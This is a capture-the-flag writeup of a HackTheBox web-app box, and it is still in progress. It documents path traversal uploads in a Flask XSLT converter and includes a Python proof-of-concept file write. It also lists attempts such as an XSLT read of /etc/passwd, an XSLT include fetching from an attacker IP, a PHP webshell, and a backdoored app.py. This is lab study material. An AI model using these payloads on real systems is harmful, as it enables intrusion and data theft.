# Conversor - HackTheBox Writeup

## Target Information
- **IP**: 10.10.11.92
- **Hostname**: conversor.htb
- **OS**: Ubuntu (Linux)
- **Services**: SSH (22), HTTP (80)

---

## Executive Summary

Conversor is a Flask-based web application that converts XML files using user-supplied XSLT stylesheets. The application contains a **critical path traversal vulnerability** in the file upload functionality that allows writing arbitrary files to locations where the web user has write permissions. However, achieving code execution requires triggering a Flask/WSGI reload, which is the main challenge.

---

## Enumeration

### Port Scan
```bash
nmap -sCV -p- --min-rate=5000 10.10.11.92
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.9p1 Ubuntu |
| 80 | HTTP | Apache/2.4.52 (Ubuntu) |

### Web Application Analysis

The application provides:
- User registration/login system
- XML to HTML conversion using XSLT
- File upload for both XML and XSLT files
- Downloadable source code at `/static/source_code.tar.gz`

### Source Code Review

**Key file: `app.py`**

```python
# Critical vulnerability - no filename sanitization
xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
xml_file.save(xml_path)
xslt_file.save(xslt_path)

# XSLT parser - no access restrictions (unlike XML parser)
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
xml_tree = etree.parse(xml_path, parser)
xslt_tree = etree.parse(xslt_path)  # <-- NO RESTRICTIONS
transform = etree.XSLT(xslt_tree)
```

**Other findings:**
- Flask secret key: `Changemeplease` (hardcoded, but may differ in production)
- Database: SQLite at `/var/www/conversor.htb/instance/users.db`
- XSLT Engine: libxslt (via lxml)
- Password hashing: MD5 (weak)

---

## Vulnerabilities Identified

### 1. Path Traversal (Critical)

**Location**: `/convert` endpoint, lines 99-102

**Cause**: `os.path.join()` does not sanitize path traversal sequences in filenames.

**Proof of Concept**:
```python
import requests

s = requests.Session()
s.post('http://conversor.htb/login', data={'username': 'user', 'password': 'pass'})

# Write to /var/www/conversor.htb/static/test.txt
with open('data.xml', 'rb') as xml_f:
    files = {
        'xml_file': ('data.xml', xml_f, 'text/xml'),
        'xslt_file': ('../static/test.txt', b'PWNED', 'text/plain')
    }
    r = s.post('http://conversor.htb/convert', files=files)
```

**Verification**:
```bash
curl http://conversor.htb/static/test.txt
# Output: PWNED
```

### 2. Weak Flask Secret Key (Medium)

**Value**: `Changemeplease`

**Impact**: Session forgery possible if production uses same key (testing showed it may be different).

### 3. XSLT Injection Potential (Medium)

The XSLT parser has no access control, but libxslt's default security settings block:
- `document()` function for file reading
- `xsl:import`/`xsl:include` for external files
- Network access

---

## Exploitation Attempts

### Attempt 1: XXE via XML
**Result**: FAILED
- XML parser has `resolve_entities=False` which blocks XXE

### Attempt 2: XSLT File Read via document()
**Result**: FAILED
```xml
<xsl:copy-of select="document('/etc/passwd')"/>
```
- Error: "Cannot resolve URI /etc/passwd"

### Attempt 3: XSLT SSRF via xsl:include
**Result**: FAILED
```xml
<xsl:include href="http://10.10.16.10:8888/test.xslt"/>
```
- Error: "Cannot resolve URI http://..."

### Attempt 4: PHP Webshell
**Result**: FAILED
- Wrote PHP file to `/static/shell.php`
- Apache serves as plaintext, PHP not executed

### Attempt 5: CGI Execution via .htaccess
**Result**: FAILED (and broke the site temporarily)
- CGI not enabled/available

### Attempt 6: Flask App Overwrite
**Result**: PARTIAL SUCCESS
- Successfully wrote backdoored `app.py`
- Flask does NOT auto-reload in production
- Need to trigger WSGI daemon restart

### Attempt 7: WSGI Trigger Files
**Result**: FAILED
- Wrote `conversor.wsgi`, `wsgi.py`, etc.
- No automatic reload observed

### Attempt 8: SSH Key Injection
**Result**: FAILED
- Cannot write to `/home/*/` directories (permission denied)

### Attempt 9: Cron Job Injection
**Result**: FAILED
- Cannot write to `/etc/cron.d/` (permission denied)

### Attempt 10: Python .pth File Injection
**Result**: FAILED
- Cannot write to system site-packages (permission denied)

---

## Writable Locations Confirmed

| Location | Writable | Notes |
|----------|----------|-------|
| `/var/www/conversor.htb/uploads/` | YES | Default upload dir |
| `/var/www/conversor.htb/static/` | YES | Served by Apache |
| `/var/www/conversor.htb/templates/` | YES | Jinja2 templates (cached) |
| `/var/www/conversor.htb/instance/` | YES | Contains SQLite DB |
| `/var/www/conversor.htb/` | YES | App root |
| `/tmp/` | YES | Temp directory |
| `/etc/cron.d/` | NO | Permission denied |
| `/home/*/` | NO | Permission denied |
| System Python paths | NO | Permission denied |

---

## Key Technical Insights

### Why File Write Doesn't Lead to RCE (Yet)

1. **Flask Production Mode**: No auto-reload on file changes
2. **mod_wsgi Daemon Mode**: Requires explicit touch of WSGI script or restart
3. **Template Caching**: Jinja2 caches templates, changes not reflected
4. **No PHP/CGI**: Apache not configured for script execution in writable dirs

### XSLT Security Model

libxslt (used by lxml) has default access controls:
- File system access via `document()` is restricted
- Network access is blocked
- Extension functions are limited

However, the XSLT **parser itself** (`etree.parse(xslt_path)`) has no restrictions - it will attempt to parse any file as XML/XSLT.

---

## Potential Attack Vectors (Untested/Incomplete)

### 1. XSLT Chain Attack
Write a valid XSLT file via path traversal, then use `xsl:import` with relative path to include it:

```python
# Step 1: Write exploit XSLT
files = {'xslt_file': ('../static/evil.xslt', malicious_xslt, 'text/xml')}

# Step 2: Include from main XSLT
main_xslt = '''<xsl:import href="../static/evil.xslt"/>'''
```

### 2. Database Manipulation
Write to `instance/users.db` to:
- Add admin user
- Modify existing user privileges
- (Note: This corrupts DB if not done carefully)

### 3. Service Restart Trigger
Find a way to crash/restart the WSGI service:
- Memory exhaustion
- File descriptor exhaustion
- Trigger OOM killer

### 4. Race Condition
Exploit timing between file save and XSLT parse to read files.

---

## Lessons Learned

1. **Path traversal in file uploads** is a critical vulnerability even without direct code execution
2. **Source code access** dramatically speeds up vulnerability discovery
3. **Production Flask/WSGI** configurations block many quick-win exploitation paths
4. **XSLT processors** have complex security models that require deep understanding
5. **Always verify write operations** before assuming they lead to code execution

---

## Recommendations for Box Completion

1. **Reset the box** (database was corrupted during testing)
2. **Focus on WSGI reload triggers** - research mod_wsgi reload mechanisms
3. **Investigate XSLT extensions** - may have missed exploitable functions
4. **Check for scheduled tasks** - cron jobs that might execute uploaded files
5. **Enumerate internal services** - there may be services not exposed externally

---

## Tools Used

- nmap
- curl
- Python requests
- flask-unsign
- lxml documentation

---

## References

- [lxml XSLT Documentation](https://lxml.de/xslt.html)
- [XSLT Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations)
- [mod_wsgi Reloading](https://modwsgi.readthedocs.io/en/master/user-guides/reloading-source-code.html)
- [Flask Session Forgery](https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce)

---

## Status: IN PROGRESS

**Current Blocker**: Need mechanism to trigger Flask/WSGI reload after writing backdoored app.py

**Next Steps After Reset**:
1. Re-establish access
2. Test XSLT chain attack with relative imports
3. Research alternative reload triggers
4. Consider timing-based attacks
